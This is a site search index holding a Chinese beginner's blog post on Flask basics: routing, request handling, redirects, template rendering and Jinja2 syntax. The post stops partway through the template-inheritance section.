<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python-Flask（完善中...）</title>
      <link href="/undefined/bf39/"/>
      <url>/undefined/bf39/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Flask"><a href="#Python-Flask" class="headerlink" title="Python-Flask"></a>Python-Flask</h1><h2 id="初识Flask"><a href="#初识Flask" class="headerlink" title="初识Flask"></a>初识Flask</h2><p>思考：Flask是Python中的Web应用程序框架，以我的初步理解来看就是能生成web页面，这不得不让我联想到了PHP，同样都是可以生成Web，想必他们一定有很多差异值得探讨。</p><p>首先引起我注意的是框架这个字眼，我们暂且用打包这个说法来定义吧，这个框架相当于一个预先编写好的结构，对于Web应用程序它提供了相应的基本功能和组件，这里就有我们所熟知的<strong>处理HTTP请求、路由URL、渲染模板、管理用户会话等基本功能</strong>。</p><p>所以，不难发现，这个flask框架跳过了那些繁琐的构建网页前所需的一些设置，协议，让用户通过这个框架，模板去套，更专注于开发、测试和维护网页。</p><h3 id="Flask的内核：Werkzeug-Jinja2"><a href="#Flask的内核：Werkzeug-Jinja2" class="headerlink" title="Flask的内核：Werkzeug&amp;Jinja2"></a>Flask的内核：Werkzeug&amp;Jinja2</h3><p>Werkzeug：Werkzeug是一个WSGI（Web Server Gateway Interface）工具库，<strong>它提供了实现HTTP请求、响应处理、URL路由等功能的核心组件，为Flask提供了底层的HTTP请求处理能力。</strong></p><p>Jinja2：Jinja2是一个现代化的模板引擎，它允许开发者使用类似Python的语法来创建动态内容的模板。<strong>Flask使用Jinja2来渲染Web应用程序中的HTML模板，从而让开发者能够动态地生成网页内容。</strong></p><p>除了这两个核心组件外，Flask还有许多扩展，可以用于处理表单、数据库集成、身份验证等各种功能。</p><p>现在看到了表单、数据库等熟悉的字眼，从宏观上来看大体构建网站思路还是一样的</p><h3 id="关于Flask和PHP"><a href="#关于Flask和PHP" class="headerlink" title="关于Flask和PHP"></a>关于Flask和PHP</h3><p>这是基于刚才的思考疑惑，大体上来讲，可能PHP性能上来说要优于Flask，但由于Python拥有大量的库可以支撑，其实这个差异就被弥补了；再者，PHP可以直接用于编写Web应用程序的后端逻辑，而Flask则提供了一种结构化的方式来组织Python代码。总而言之，两者在开发上没啥太大区别，不过多点思考也是好的</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--项目名</span><br><span class="line">|---static    (静态)</span><br><span class="line">|---templates(模板)</span><br><span class="line">|---app.py(运行|启动)</span><br></pre></td></tr></table></figure><p>Flask启动项目默认为app.py</p><h2 id="Flask程序"><a href="#Flask程序" class="headerlink" title="Flask程序"></a>Flask程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>我们来看这么一个基本代码，它会在web页面上输出Hello, World!我们来逐行解析一下语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask：</span><br><span class="line">flask是包名，Flask是模块名</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)：</span><br><span class="line">初始化程序，同时将应用程序实例储存在app变量中</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)：</span></span><br><span class="line">route是路由的意思，这里理解成路径，告诉Flask应用程序当用户访问根URL（<span class="string">&#x27;/&#x27;</span>）时，应该调用下面定义的函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">检查当前模块是否是作为主程序执行的。如果是，接下来的代码块会被执行</span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="literal">True</span>)：</span><br><span class="line">启动了Flask应用程序的开发服务器， 默认使用本地地址和<span class="number">5000</span>端口</span><br></pre></td></tr></table></figure><h3 id="app-run"><a href="#app-run" class="headerlink" title="app.run()"></a>app.run()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(host,port,debug,load_dotenv)</span><br></pre></td></tr></table></figure><p>host指定监听主机名；port指定监听端口；debug启用或禁用调试模式。设置为 True会启用调试模式，应用会在代码发生变化时自动重启；</p><p><strong>（flask编写的程序和php不一样，每一次变动都需要重启服务器来执行变更，就显得很麻烦，为了应对这种问题，flask中的debug模式可以在不影响服务器运行下，执行更新每一次的变更。）</strong></p><p>load_dotenv设置为 True 时，会加载项目根目录下的 .env文件中的环境变量。.env文件通常用来存储应用的配置信息</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><img src="/undefined/bf39/1.png" alt="image-20240407213912357"></p><p>在app.py中，我们可以进行文件的相关配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">DEBUG：如果设置为 True，则启用调试模式。在此模式下，服务器将在代码更改时重新加载自身，并在出现未处理的异常时提供一个有用的调试器</span><br><span class="line"></span><br><span class="line">TESTING：如果设置为 True，则标记应用程序处于测试模式</span><br><span class="line"></span><br><span class="line">PROPAGATE_EXCEPTIONS：如果设置为 True，则告诉 Flask 即使未启用调试，也要传播异常</span><br><span class="line"></span><br><span class="line">SECRET_KEY：用于保持客户端会话安全</span><br><span class="line"></span><br><span class="line">PERMANENT_SESSION_LIFETIME：永久会话的生存期</span><br><span class="line"></span><br><span class="line">USE_X_SENDFILE：如果设置为 True，Flask 将尝试使用 X-Sendfile 标头来触发服务器发送文件</span><br><span class="line"></span><br><span class="line">SERVER_NAME：服务器的名称和端口号。如果未设置，将被猜测</span><br><span class="line"></span><br><span class="line">APPLICATION_ROOT：如果应用程序安装在子 URL 上，可以在此处设置。</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_NAME：会话 cookie 的名称。</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_DOMAIN：如果要为会话 cookie 设置域，可以在此处执行</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_PATH：会话 cookie 的路径</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_HTTPONLY：如果设置为 True，会将会话 cookie 标记为仅限于 HTTP</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_SECURE：如果设置为 True，则会将 cookie 标记为安全</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_SAMESITE：用于将会话 cookie 标记为 SameSite</span><br><span class="line"></span><br><span class="line">SESSION_REFRESH_EACH_REQUEST：如果设置为 True，则会在每个请求时刷新 cookie</span><br><span class="line"></span><br><span class="line">MAX_CONTENT_LENGTH：传入请求的最大内容长度</span><br><span class="line"></span><br><span class="line">SEND_FILE_MAX_AGE_DEFAULT：send_file 方法的默认缓存超时</span><br><span class="line"></span><br><span class="line">TRAP_BAD_REQUEST_ERRORS：如果设置为 True，Flask 将不会忽略来自请求数据解析的异常</span><br><span class="line"></span><br><span class="line">TRAP_HTTP_EXCEPTIONS：如果设置为 True，Flask 将会将某些异常转换为 HTTP 响应</span><br><span class="line"></span><br><span class="line">EXPLAIN_TEMPLATE_LOADING：如果设置为 True，将启用模板加载的解释</span><br><span class="line"></span><br><span class="line">PREFERRED_URL_SCHEME：如果没有 URL 方案可用，应使用的 URL 方案</span><br><span class="line"></span><br><span class="line">TEMPLATES_AUTO_RELOAD：如果设置为 True，模板将在更改时自动重新加载</span><br><span class="line"></span><br><span class="line">MAX_COOKIE_SIZE：会话 cookie 的最大大小（以字节为单位）</span><br></pre></td></tr></table></figure><h2 id="route"><a href="#route" class="headerlink" title="route()"></a>route()</h2><p>route后有相应的路径我们可以自定义，同时我们可以为相应的路径些相应的函数有两种等价形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;yoyoyo&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>():</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;who?&#x27;</span></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/user&#x27;</span>,view_func=user)//使用函数add_url_rule绑定</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/2.png" alt="image-20240407215010007"></p><p><img src="/undefined/bf39/3.png" alt="image-20240407215018829"></p><p><img src="/undefined/bf39/4.png" alt="image-20240407215030211"></p><h3 id="路由的变量规则"><a href="#路由的变量规则" class="headerlink" title="路由的变量规则"></a>路由的变量规则</h3><p>顾名思义给url添加可以传入变量的地方，在route中的路径后面添加标记<value_name></value_name></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;username:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(username)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/5.png" alt="image-20240407220203535"></p><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;打&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;瓦&#x27;</span>,<span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;吗&#x27;</span>&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get/&lt;value_name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">value_name</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;操作：&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(data.get(value_name))</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/6.png" alt="image-20240407220503899"></p><p><img src="/undefined/bf39/7.png" alt="image-20240407220512703"></p><p><img src="/undefined/bf39/8.png" alt="image-20240407220521622"></p><h3 id="Request请求"><a href="#Request请求" class="headerlink" title="Request请求"></a>Request请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method ==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;现在的请求是GET方法&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> request.method ==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;现在的请求是POST方法&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>我们要从flask包中拖取request模块，在route处设置请求方法<strong>methods</strong></p><p>request.method &#x3D;&#x3D;’GET’验证是否位get请求</p><h4 id="传参-重定向-模板渲染"><a href="#传参-重定向-模板渲染" class="headerlink" title="传参&amp;重定向&amp;模板渲染"></a>传参&amp;重定向&amp;模板渲染</h4><p>GET：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.args.get(&#x27;age&#x27;,default=1,type=int)\\接收传入的参数age，默认值为1，类型为int（后面这些可以省略）</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.form[&#x27;name&#x27;]</span><br></pre></td></tr></table></figure><p>我们举一个简单的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aaa&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaa</span>():</span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, user=user, age=age))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=user, age=age)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>aaa.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>输入<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/aaa&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;from_page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;input_page&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;age&#x27;</span> <span class="attr">placeholder</span>=<span class="string">&#x27;请输入年龄&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;&#123;user&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：项目下面要有有templates文件夹，并将html文件放进里面；templates文件夹与运行的py文件在同一级目录；</strong></p><p><img src="/undefined/bf39/9.png" alt="image-20240407231459056"></p><p>这里有几个点我们得注意：</p><p>redirect在这里作为重定向到index.html并传递了user，age等get参数</p><p>render_template<strong>渲染外部文件，render_template默认去templates文件夹中寻找文件</strong>，<strong>扩展名为.html、.htm、.xml和.xhtml 的模板中开启自动转义</strong></p>：双大括号 `` 在 Flask 中用于表示模板中的变量<p>单参数时：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,user=user)</span><br></pre></td></tr></table></figure><p>有多个参数，可以使用**contents传过去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    contents=&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;provinces&#x27;</span>:<span class="string">&#x27;北京&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,**contents)</span><br></pre></td></tr></table></figure><h4 id="render-template-string"><a href="#render-template-string" class="headerlink" title="render_template_string"></a>render_template_string</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;html&gt;&lt;h1&gt;测试&lt;/h1&gt;&lt;/html&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用于渲染字符串，这个可以用于没有外部文件的情况（render_template），直接在同文件下，定义好html代码，然后直接就可以渲染</p><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><h3 id="显示变量的值"><a href="#显示变量的值" class="headerlink" title="显示变量的值"></a>显示变量的值</h3><p>使用双大括号 <code>&#123;&#123; 变量名 &#125;&#125;</code> 来显示变量的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">    &lt;p&gt;Hello, &#123;&#123; user &#125;&#125;!&lt;/p&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;p&gt;Hello, guest!&lt;/p&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;//无序列表</span><br><span class="line">&#123;% for list in lists %&#125;</span><br><span class="line">姓名:&#123;&#123;list.name&#125;&#125;</span><br><span class="line">年龄:&#123;&#123;list.age&#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;//结束循环</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">注意：不可以使用continue和break表达式来控制循环的执行</span><br></pre></td></tr></table></figure><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p>主模板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;My Website&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        &#123;% block header %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to My Website<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        &#123;% block content %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the main content of the page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span 